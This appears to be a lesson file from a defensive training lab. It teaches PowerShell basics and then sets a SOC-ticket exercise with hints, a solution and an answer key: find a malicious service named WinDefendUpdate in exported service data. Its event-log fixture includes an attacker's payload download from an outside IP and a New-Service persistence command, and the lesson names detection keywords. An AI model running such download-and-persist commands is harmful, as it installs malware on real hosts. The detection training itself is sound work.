@@ -1,0 +1,121 @@
+tagline: PowerShell is how Windows admins and attackers both get work done. Learn cmdlets, objects and the pipeline, then use exported service data to find malware disguised as a Windows service.
+:: simple
+**PowerShell** is Windows' shell and scripting language. Its commands are **cmdlets** named `Verb-Noun`: `Get-Process`, `Get-Service`, `Stop-Service`, `Get-ADUser`. `Get-Help <cmdlet>` explains any of them, and `Get-Command *service*` finds them.
+
+```
+$ Get-Service
+$ Get-Process | Sort-Object CPU -Descending | Select-Object -First 5
+```
+
+> The big difference from bash: PowerShell pipes **objects**, not text. `Get-Process` sends process objects with properties (Name, Id, CPU), so the next cmdlet can filter on a property instead of parsing columns.
+:: mid
+### Filter, sort, select
+- `Where-Object` keeps objects matching a condition: `Where-Object Status -eq 'Running'`
+- `Sort-Object` sorts by a property, `Select-Object` picks properties or the first N
+- `Format-Table` / `Export-Csv` for output
+
+```
+$ Get-Service | Where-Object Status -eq 'Stopped'
+$ Get-LocalUser | Where-Object Enabled
+```
+
+### Remote and at scale
+`Invoke-Command -ComputerName PC01,PC02 { Get-Service spooler }` runs on many machines at once over WinRM. Admins export results to CSV and analyze them anywhere, which is what this lab does: the exports are text, so `grep`, `cut` and `sort` in the sandbox work on them.
+
+```
+$ head -3 ~/exports/services.csv
+```
+:: complex
+### Hunting with PowerShell
+Malware loves to hide as a **service**: it survives reboots and runs as SYSTEM. Real Windows services run from `C:\Windows\System32` (or `Program Files` for apps), are signed by Microsoft or a known vendor, and have sensible names. Red flags: a binary in `C:\Users\...\AppData`, `C:\ProgramData` or `Temp`, a name that's *almost* a real one, an unsigned binary.
+
+```
+$ Get-CimInstance Win32_Service | Select-Object Name, PathName, StartMode
+$ grep -viE "C:\\\\Windows\\\\|Program Files" ~/exports/services.csv
+```
+
+### Logging and security
+Attackers use PowerShell too (downloading payloads, running in memory, `-EncodedCommand` to hide scripts). Defend with **Script Block Logging** (event 4104 records the decoded script), **Constrained Language Mode** and AMSI, and by alerting on `-enc`, `IEX` and `DownloadString`.
+
+```
+$ grep -i "4104" ~/exports/powershell-events.txt
+```
+:: lab
+style: ticket
+host: ws-admin
+user: admin
+system: SOC queue
+id: #SOC-2307
+subject: EDR: unsigned binary running as SYSTEM on FIN-LT-031
+priority: P1
+from: EDR alert
+sla: 1h
+attach: services.csv, signatures.csv, powershell-events.txt
+:: brief
+EDR flagged an unsigned binary running as SYSTEM on FIN-LT-031. The responder ran `Get-CimInstance Win32_Service | Export-Csv` and an `Get-AuthenticodeSignature` sweep, attached as CSVs.
+
+Find the **malicious service** pretending to be a legitimate Windows one.
+
+Resolve the ticket with the **service name** (the `Name` column).
+:: answer
+WinDefendUpdate
+:: hint
+Filter out services that run from the normal Windows and Program Files folders: `grep -viE "C:\\\\Windows\\\\|Program Files" ~/exports/services.csv`
+:: hint
+Cross-check the remaining binaries against `signatures.csv`. Which one is NotSigned?
+:: solution
+Filtering services by path leaves two: the real Defender (its normal home is under ProgramData) and **WinDefendUpdate**, display name "Windows Defender Update Service", running as LocalSystem from `C:\ProgramData\WinDef\wdupdate.exe`. Real Defender is `WinDefend`, running `MsMpEng.exe` from `C:\ProgramData\Microsoft\Windows Defender\Platform\...` and signed by Microsoft. `signatures.csv` shows `wdupdate.exe` is **NotSigned**, and `powershell-events.txt` has a 4104 entry where the service was created with `New-Service` from an encoded command. The malicious service is **WinDefendUpdate**. Contain the host, then `Stop-Service` / `sc.exe delete`, preserve the binary for analysis, and hunt for the same hash on other machines.
+:: verify
+grep -viE "C:\\\\Windows\\\\|Program Files" ~/exports/services.csv
+:: file /home/admin/exports/services.csv
+Name,DisplayName,State,StartMode,StartName,PathName
+Spooler,Print Spooler,Running,Auto,LocalSystem,C:\Windows\System32\spoolsv.exe
+WinDefend,Microsoft Defender Antivirus Service,Running,Auto,LocalSystem,"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090-0\MsMpEng.exe"
+wuauserv,Windows Update,Running,Manual,LocalSystem,C:\Windows\system32\svchost.exe -k netsvcs -p
+Dnscache,DNS Client,Running,Auto,NT AUTHORITY\NetworkService,C:\Windows\system32\svchost.exe -k NetworkService -p
+WinDefendUpdate,Windows Defender Update Service,Running,Auto,LocalSystem,C:\ProgramData\WinDef\wdupdate.exe
+TeamViewer,TeamViewer,Stopped,Manual,LocalSystem,"C:\Program Files\TeamViewer\TeamViewer_Service.exe"
+EventLog,Windows Event Log,Running,Auto,NT AUTHORITY\LocalService,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
+:: file /home/admin/exports/signatures.csv
+Path,Status,Signer
+C:\Windows\System32\spoolsv.exe,Valid,Microsoft Windows
+C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090-0\MsMpEng.exe,Valid,Microsoft Corporation
+C:\ProgramData\WinDef\wdupdate.exe,NotSigned,
+C:\Program Files\TeamViewer\TeamViewer_Service.exe,Valid,TeamViewer Germany GmbH
+:: file /home/admin/exports/powershell-events.txt
+2026-11-06 22:14:09 4104 ScriptBlock: New-Service -Name WinDefendUpdate -DisplayName 'Windows Defender Update Service' -BinaryPathName 'C:\ProgramData\WinDef\wdupdate.exe' -StartupType Automatic
+2026-11-06 22:13:58 4104 ScriptBlock: (decoded from -EncodedCommand) iwr hxxp://198.51.100.12/u.bin -OutFile C:\ProgramData\WinDef\wdupdate.exe
+2026-11-07 08:01:12 4104 ScriptBlock: Get-Service | Where-Object Status -eq 'Stopped'
+:: cmd ^Get-Service( \| Where-Object Status -eq .Stopped.)?$
+Status   Name               DisplayName
+------   ----               -----------
+Running  Dnscache           DNS Client
+Running  EventLog           Windows Event Log
+Running  Spooler            Print Spooler
+Stopped  TeamViewer         TeamViewer
+Running  WinDefend          Microsoft Defender Antivirus Service
+Running  WinDefendUpdate    Windows Defender Update Service
+Running  wuauserv           Windows Update
+:: cmd ^Get-Process \| Sort-Object CPU -Descending \| Select-Object -First 5$
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  ProcessName
+-------  ------    -----      -----     ------     --  -----------
+   2210     118   412300     388120   1840.22   3312  MsMpEng
+    980      61   220144     190332    912.40   7720  wdupdate
+   1504      88   180220     170004    401.13   1188  explorer
+    611      30    90112      88320    120.55   4410  OUTLOOK
+    322      18    40220      38104     44.02   2004  svchost
+:: cmd ^Get-LocalUser
+Name               Enabled Description
+----               ------- -----------
+Administrator      False   Built-in account for administering the computer/domain
+DefaultAccount     False   A user account managed by the system.
+Guest              False   Built-in account for guest access to the computer/domain
+WDAGUtilityAccount False
+it-localadmin      True    LAPS-managed local admin
+:: cmd ^Get-CimInstance Win32_Service
+Name             PathName                                                     StartMode
+----             --------                                                     ---------
+Spooler          C:\Windows\System32\spoolsv.exe                              Auto
+WinDefend        "C:\ProgramData\Microsoft\Windows Defender\Platform\...\MsMpEng.exe" Auto
+WinDefendUpdate  C:\ProgramData\WinDef\wdupdate.exe                           Auto
+wuauserv         C:\Windows\system32\svchost.exe -k netsvcs -p                Manual
